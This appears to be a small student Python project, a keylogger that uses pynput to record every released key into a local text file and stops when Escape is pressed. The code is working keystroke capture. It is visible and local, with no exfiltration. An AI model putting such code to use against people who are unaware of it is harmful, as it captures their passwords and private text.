from pynput import keyboard
import datetime

now = datetime.datetime.now()

# def on_press(key):
#     try:
#         print(f'Alphanumeric Key {key.char} pressed')
#     except AttributeError:
#         print(f'Special Key {key} pressed')

def on_release(key):
    
    file_path = "C:\\Users\\Mir Sahil\\projects\\Internship projects\\Simple Keylogger\\log.txt"
    with open(file_path, "a") as f:
        
        f.write(f" {key}")
    
    with open(file_path, "r") as f:
        content = f.read()
        content = content.replace("'", "")
        content = content.replace("Key.space", " ")
        
        content = content.replace("Key.esc",f"\n\n[{now.day}-{now.month}-{now.year} {now.hour}:{now.minute}:{now.second}] ESCAPE PRESSED\n")
        content = content.replace("Key.", " ")
        
    
    with open(file_path, "w") as f:
        f.write(content)

    if key == keyboard.Key.esc: 
        # Stop listener
        print("Escape key pressed. Exiting...")
        return False

with keyboard.Listener(on_release=on_release) as listener:
    listener.join()


